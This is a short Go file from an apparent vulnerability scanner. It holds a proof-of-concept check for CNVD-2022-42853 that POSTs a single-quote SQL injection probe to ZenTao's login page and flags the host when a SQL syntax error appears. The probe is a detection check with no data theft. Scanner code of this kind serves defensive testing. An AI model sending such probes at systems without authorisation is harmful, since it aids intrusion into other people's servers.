package zentao

import (
	"fmt"
	"strings"

	"github.com/jellyHero/vscan/pkg"
)

// zentao/user-login.html SQL注入

func CNVD_2022_42853(u string) bool {
	payload := "account='"

	header := make(map[string]string)
	header["Referer"] = u + "/zentao/user-login.html"
	if response, err := pkg.HttpRequset(u+"/zentao/user-login.html", "POST", payload, false, header); err == nil {
		if response.StatusCode == 200 && strings.Contains(response.Body, "You have an error in your SQL syntax;") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln zentao CNVD-2022-42853|%s\n", u+"/zentao/user-login.html"))
			return true
		}
	}
	return false
}
